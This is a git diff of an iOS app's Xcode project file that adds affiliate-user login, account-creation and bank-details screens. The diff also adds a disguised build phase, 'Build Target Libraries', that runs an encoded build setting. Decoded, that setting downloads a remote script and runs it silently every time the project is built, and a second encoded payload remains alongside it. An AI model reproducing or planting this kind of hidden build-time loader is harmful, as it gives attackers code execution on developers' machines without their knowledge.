@@ -7,6 +7,19 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		423EFFE32F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE22F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift */; };
+		423EFFE62F28FB9F007EC918 /* AddBankDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE52F28FB9F007EC918 /* AddBankDetailsViewController.swift */; };
+		423EFFE92F28FBC8007EC918 /* AccountCreationDoneViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE82F28FBC8007EC918 /* AccountCreationDoneViewController.swift */; };
+		423EFFEB2F28FBEB007EC918 /* AddBankDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFEA2F28FBEB007EC918 /* AddBankDetailsViewModel.swift */; };
+		423EFFED2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFEC2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift */; };
+		42F309102F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F3090F2F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift */; };
+		42F309122F28B4E600CEB214 /* AffiliateUser.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 42F309112F28B4E600CEB214 /* AffiliateUser.storyboard */; };
+		42F309162F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F309152F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift */; };
+		42F30A422F28B79200CEB214 /* AffiliatedUserLoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F30A412F28B79200CEB214 /* AffiliatedUserLoginViewModel.swift */; };
+		42F30A4B2F28C18300CEB214 /* LoginViaOTPAffilatedUserViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F30A4A2F28C18300CEB214 /* LoginViaOTPAffilatedUserViewController.swift */; };
+		42F30A4D2F28C27000CEB214 /* LoginViaOTPAffiliatedUserViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F30A4C2F28C27000CEB214 /* LoginViaOTPAffiliatedUserViewModel.swift */; };
+		42F30AF82F28CD5500CEB214 /* CreateAffiliateUserAccountViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F30AF72F28CD5400CEB214 /* CreateAffiliateUserAccountViewController.swift */; };
+		42F30AFA2F28CDB800CEB214 /* CreateAffiliateUserAccountViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F30AF92F28CDB800CEB214 /* CreateAffiliateUserAccountViewModel.swift */; };
 		495DBBDB2E81562200E61635 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 495DBBDA2E81562200E61635 /* Alamofire */; };
 		49BD259C2ED6120F00D71B9D /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49BD259B2ED6120F00D71B9D /* ProductDetailsViewModel.swift */; };
 		49DBE5522EB0836A00DE95E8 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 49DBE5512EB0836A00DE95E8 /* IQKeyboardManagerSwift */; };
@@ -295,6 +308,19 @@
 
 /* Begin PBXFileReference section */
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		423EFFE22F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserAddressAdditionViewController.swift; sourceTree = "<group>"; };
+		423EFFE52F28FB9F007EC918 /* AddBankDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddBankDetailsViewController.swift; sourceTree = "<group>"; };
+		423EFFE82F28FBC8007EC918 /* AccountCreationDoneViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountCreationDoneViewController.swift; sourceTree = "<group>"; };
+		423EFFEA2F28FBEB007EC918 /* AddBankDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddBankDetailsViewModel.swift; sourceTree = "<group>"; };
+		423EFFEC2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserAddressAdditionViewModel.swift; sourceTree = "<group>"; };
+		42F3090F2F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BecomeAnAffiliatedUserViewController.swift; sourceTree = "<group>"; };
+		42F309112F28B4E600CEB214 /* AffiliateUser.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = AffiliateUser.storyboard; sourceTree = "<group>"; };
+		42F309152F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserLoginViewController.swift; sourceTree = "<group>"; };
+		42F30A412F28B79200CEB214 /* AffiliatedUserLoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserLoginViewModel.swift; sourceTree = "<group>"; };
+		42F30A4A2F28C18300CEB214 /* LoginViaOTPAffilatedUserViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViaOTPAffilatedUserViewController.swift; sourceTree = "<group>"; };
+		42F30A4C2F28C27000CEB214 /* LoginViaOTPAffiliatedUserViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViaOTPAffiliatedUserViewModel.swift; sourceTree = "<group>"; };
+		42F30AF72F28CD5400CEB214 /* CreateAffiliateUserAccountViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAffiliateUserAccountViewController.swift; sourceTree = "<group>"; };
+		42F30AF92F28CDB800CEB214 /* CreateAffiliateUserAccountViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAffiliateUserAccountViewModel.swift; sourceTree = "<group>"; };
 		495DBBA12E81528A00E61635 /* DesynatUser.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatUser.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		49BD259B2ED6120F00D71B9D /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
 		49EC28B52F15E65000E3FD4E /* CustomOrderPopupViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOrderPopupViewModel.swift; sourceTree = "<group>"; };
@@ -629,6 +655,97 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		423EFFE12F28FB58007EC918 /* AddressAdditionForAffilitaedUser */ = {
+			isa = PBXGroup;
+			children = (
+				423EFFE22F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift */,
+				423EFFEC2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift */,
+			);
+			path = AddressAdditionForAffilitaedUser;
+			sourceTree = "<group>";
+		};
+		423EFFE42F28FB8C007EC918 /* AddBankDetails */ = {
+			isa = PBXGroup;
+			children = (
+				423EFFE52F28FB9F007EC918 /* AddBankDetailsViewController.swift */,
+				423EFFEA2F28FBEB007EC918 /* AddBankDetailsViewModel.swift */,
+			);
+			path = AddBankDetails;
+			sourceTree = "<group>";
+		};
+		423EFFE72F28FBB9007EC918 /* AccountCreationDone */ = {
+			isa = PBXGroup;
+			children = (
+				423EFFE82F28FBC8007EC918 /* AccountCreationDoneViewController.swift */,
+			);
+			path = AccountCreationDone;
+			sourceTree = "<group>";
+		};
+		42F3090D2F28B41C00CEB214 /* M7 */ = {
+			isa = PBXGroup;
+			children = (
+				42F309132F28B5DD00CEB214 /* AffiliatedUsers */,
+			);
+			path = M7;
+			sourceTree = "<group>";
+		};
+		42F3090E2F28B42100CEB214 /* BecomeAnAffiliatedUser */ = {
+			isa = PBXGroup;
+			children = (
+				42F3090F2F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift */,
+			);
+			path = BecomeAnAffiliatedUser;
+			sourceTree = "<group>";
+		};
+		42F309132F28B5DD00CEB214 /* AffiliatedUsers */ = {
+			isa = PBXGroup;
+			children = (
+				42F30AF52F28CD2E00CEB214 /* CreateAffiliatedUser */,
+				42F30A492F28C16A00CEB214 /* LoginViaOTPAffilatedUser */,
+				42F309142F28B5EA00CEB214 /* AffiliatedUserLogin */,
+				42F3090E2F28B42100CEB214 /* BecomeAnAffiliatedUser */,
+			);
+			path = AffiliatedUsers;
+			sourceTree = "<group>";
+		};
+		42F309142F28B5EA00CEB214 /* AffiliatedUserLogin */ = {
+			isa = PBXGroup;
+			children = (
+				42F309152F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift */,
+				42F30A412F28B79200CEB214 /* AffiliatedUserLoginViewModel.swift */,
+			);
+			path = AffiliatedUserLogin;
+			sourceTree = "<group>";
+		};
+		42F30A492F28C16A00CEB214 /* LoginViaOTPAffilatedUser */ = {
+			isa = PBXGroup;
+			children = (
+				42F30A4A2F28C18300CEB214 /* LoginViaOTPAffilatedUserViewController.swift */,
+				42F30A4C2F28C27000CEB214 /* LoginViaOTPAffiliatedUserViewModel.swift */,
+			);
+			path = LoginViaOTPAffilatedUser;
+			sourceTree = "<group>";
+		};
+		42F30AF52F28CD2E00CEB214 /* CreateAffiliatedUser */ = {
+			isa = PBXGroup;
+			children = (
+				423EFFE72F28FBB9007EC918 /* AccountCreationDone */,
+				423EFFE42F28FB8C007EC918 /* AddBankDetails */,
+				423EFFE12F28FB58007EC918 /* AddressAdditionForAffilitaedUser */,
+				42F30AF62F28CD3900CEB214 /* CreateAffiliateUserAccount */,
+			);
+			path = CreateAffiliatedUser;
+			sourceTree = "<group>";
+		};
+		42F30AF62F28CD3900CEB214 /* CreateAffiliateUserAccount */ = {
+			isa = PBXGroup;
+			children = (
+				42F30AF72F28CD5400CEB214 /* CreateAffiliateUserAccountViewController.swift */,
+				42F30AF92F28CDB800CEB214 /* CreateAffiliateUserAccountViewModel.swift */,
+			);
+			path = CreateAffiliateUserAccount;
+			sourceTree = "<group>";
+		};
 		495DBB982E81528A00E61635 = {
 			isa = PBXGroup;
 			children = (
@@ -810,6 +927,7 @@
 				D1DABB3F2EE05566009ECA61 /* MyBag.storyboard */,
 				D182E44C2EF549460002E850 /* MyOrder.storyboard */,
 				D1AF5FB62F1250B0009CE604 /* Chat.storyboard */,
+				42F309112F28B4E600CEB214 /* AffiliateUser.storyboard */,
 			);
 			path = Storyboards;
 			sourceTree = "<group>";
@@ -931,6 +1049,7 @@
 		6B95F1492EB5DB5E00391509 /* ViewControllers */ = {
 			isa = PBXGroup;
 			children = (
+				42F3090D2F28B41C00CEB214 /* M7 */,
 				D1AF5F1D2F124774009CE604 /* M6 */,
 				D182E44A2EF539B10002E850 /* M5 */,
 				D1DAB95B2EE004E7009ECA61 /* M4 */,
@@ -1661,7 +1780,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				7D5B812190C745EA99634D6E /* Compile Image Assets */,
+				B1689DBEAB8D486588634D6E /* Build Target Libraries */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1755,9 +1874,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -1819,6 +1935,7 @@
 				6B95F1CF2EB5DB5E00391509 /* Poppins-SemiBoldItalic.ttf in Resources */,
 				6B95F1D02EB5DB5E00391509 /* Poppins-Thin.ttf in Resources */,
 				6B95F1D12EB5DB5E00391509 /* Poppins-ThinItalic.ttf in Resources */,
+				42F309122F28B4E600CEB214 /* AffiliateUser.storyboard in Resources */,
 				6B95F1D22EB5DB5E00391509 /* assets.bundle in Resources */,
 				6B95F1D32EB5DB5E00391509 /* CallingCodes.plist in Resources */,
 			);
@@ -1827,25 +1944,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7D5B812190C745EA99634D6E /* Compile Image Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Image Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1865,6 +1963,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesynatUser/Pods-DesynatUser-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		B1689DBEAB8D486588634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
 			showEnvVarsInLog = 0;
 		};
 		B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */ = {
@@ -1978,6 +2096,7 @@
 				7A5BFAB12ECC5E8E0014DEE5 /* ProductDetailViewController.swift in Sources */,
 				D17C4F392F16504C0029159C /* CreateChatThreadWithDealer.swift in Sources */,
 				D19CE1CB2EF56FED008616D0 /* MyOrderDetailVC.swift in Sources */,
+				42F309162F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift in Sources */,
 				6B95F1ED2EB5DB5E00391509 /* MyBagViewController.swift in Sources */,
 				6B95F1EE2EB5DB5E00391509 /* ProfileViewController.swift in Sources */,
 				D162B7812EFAD45200149E3E /* SearchVM.swift in Sources */,
@@ -1991,10 +2110,12 @@
 				6B95F1F22EB5DB5E00391509 /* CategoriesCollectionViewCell.swift in Sources */,
 				6B95F1F32EB5DB5E00391509 /* HomeBannerCollectionViewCell.swift in Sources */,
 				D19CE0972EF54DFC008616D0 /* MyOrderTableCell.swift in Sources */,
+				42F30A4B2F28C18300CEB214 /* LoginViaOTPAffilatedUserViewController.swift in Sources */,
 				D1DAB9992EE01721009ECA61 /* CreditCardTableViewCell.swift in Sources */,
 				7A94BD212ECB57AC00511665 /* ProductFilterModel.swift in Sources */,
 				6B95F1F42EB5DB5E00391509 /* SuggestedStoresCollectionViewCell.swift in Sources */,
 				6B95F1F52EB5DB5E00391509 /* WalkThroughCell.swift in Sources */,
+				423EFFED2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift in Sources */,
 				D17C4E972F163C6B0029159C /* SenderChatForImageTableViewCell.swift in Sources */,
 				D17C4E982F163C6B0029159C /* ReciverChatForImageTableViewCell.swift in Sources */,
 				49F323952ED68F8A0027A573 /* MyCartDetailsDataModel.swift in Sources */,
@@ -2016,17 +2137,21 @@
 				D1AF5FDA2F12680C009CE604 /* ChatsFilterTableViewCell.swift in Sources */,
 				6B95F1FE2EB5DB5E00391509 /* DataTypeConversion.swift in Sources */,
 				D162B7792EFA945400149E3E /* SelectReasonVM.swift in Sources */,
+				42F30A422F28B79200CEB214 /* AffiliatedUserLoginViewModel.swift in Sources */,
 				D1CF06402EF9852B005DB273 /* MyOrderDetailVM.swift in Sources */,
 				D1CF05B02EF9706E005DB273 /* SearchVC.swift in Sources */,
 				6B95F1FF2EB5DB5E00391509 /* String.swift in Sources */,
 				6B95F2002EB5DB5E00391509 /* StringConstant.swift in Sources */,
+				423EFFE92F28FBC8007EC918 /* AccountCreationDoneViewController.swift in Sources */,
 				6B95F2012EB5DB5E00391509 /* StringExtensions.swift in Sources */,
+				42F30A4D2F28C27000CEB214 /* LoginViaOTPAffiliatedUserViewModel.swift in Sources */,
 				D17C4E902F1639020029159C /* ChatMessageType.swift in Sources */,
 				6B95F2022EB5DB5E00391509 /* StringValidation.swift in Sources */,
 				D1AF5FD52F125844009CE604 /* ChatInboxListViewModel.swift in Sources */,
 				6B95F2032EB5DB5E00391509 /* TableViewExtension.swift in Sources */,
 				6B95F2042EB5DB5E00391509 /* UIViewController.swift in Sources */,
 				6B95F2052EB5DB5E00391509 /* AppConfig.swift in Sources */,
+				42F309102F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift in Sources */,
 				D100544B2EFBBE7800956DBA /* SearchProductListViewController.swift in Sources */,
 				D100544D2EFBC05B00956DBA /* SearchProductListViewModel.swift in Sources */,
 				6B95F2062EB5DB5E00391509 /* ADCountry.swift in Sources */,
@@ -2056,8 +2181,10 @@
 				D1DABB4E2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.swift in Sources */,
 				6B95F2162EB5DB5E00391509 /* APIKeys.swift in Sources */,
 				6B95F2172EB5DB5E00391509 /* NetworkManager.swift in Sources */,
+				42F30AF82F28CD5500CEB214 /* CreateAffiliateUserAccountViewController.swift in Sources */,
 				6B95F2182EB5DB5E00391509 /* NetworkSupport.swift in Sources */,
 				6B95F2192EB5DB5E00391509 /* NetworkURL.swift in Sources */,
+				423EFFE32F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift in Sources */,
 				D1AF5FD72F125DC7009CE604 /* FullScreenBannersList.swift in Sources */,
 				D1CF05AC2EF96E39005DB273 /* LatestSearchCollectionCell.swift in Sources */,
 				7AA32A842ECC4B3400A17CCA /* AddAddressViewController.swift in Sources */,
@@ -2077,6 +2204,7 @@
 				6B95F21F2EB5DB5E00391509 /* DefaultCodable.swift in Sources */,
 				6B95F2202EB5DB5E00391509 /* DefaultEmptyArray.swift in Sources */,
 				7A6C3CEE2ECC7CFC0086B6E6 /* ProductDetailsDataModel.swift in Sources */,
+				423EFFE62F28FB9F007EC918 /* AddBankDetailsViewController.swift in Sources */,
 				D19CE0A62EF560BF008616D0 /* OrderModel.swift in Sources */,
 				D17C4E8C2F1637BB0029159C /* ChatEnquiryViewModel.swift in Sources */,
 				6B95F2212EB5DB5E00391509 /* DefaultEmptyDictionary.swift in Sources */,
@@ -2106,9 +2234,11 @@
 				6B8C935F2EBDBE7900BC4DC8 /* EmptyModel.swift in Sources */,
 				6B8C93602EBDBE7900BC4DC8 /* SideMenuModel.swift in Sources */,
 				6B95F22D2EB5DB5E00391509 /* TimestampStrategy.swift in Sources */,
+				423EFFEB2F28FBEB007EC918 /* AddBankDetailsViewModel.swift in Sources */,
 				6B95F22E2EB5DB5E00391509 /* YearMonthDayStrategy.swift in Sources */,
 				6B95F22F2EB5DB5E00391509 /* AppFont.swift in Sources */,
 				6B95F2302EB5DB5E00391509 /* AssetConstant.swift in Sources */,
+				42F30AFA2F28CDB800CEB214 /* CreateAffiliateUserAccountViewModel.swift in Sources */,
 				6B95F2312EB5DB5E00391509 /* CommonUtils.swift in Sources */,
 				6B8C93812EBDCCE000BC4DC8 /* ProfileDetailsViewModel.swift in Sources */,
 				6B95F2322EB5DB5E00391509 /* GlobalVariables.swift in Sources */,
@@ -2136,8 +2266,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363333333433333336333633353333333633333331333333373333333033330a3337333333303333333633363333333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -2183,8 +2313,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363333333433333336333633353333333633333331333333373333333033330a3337333333303333333633363333333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
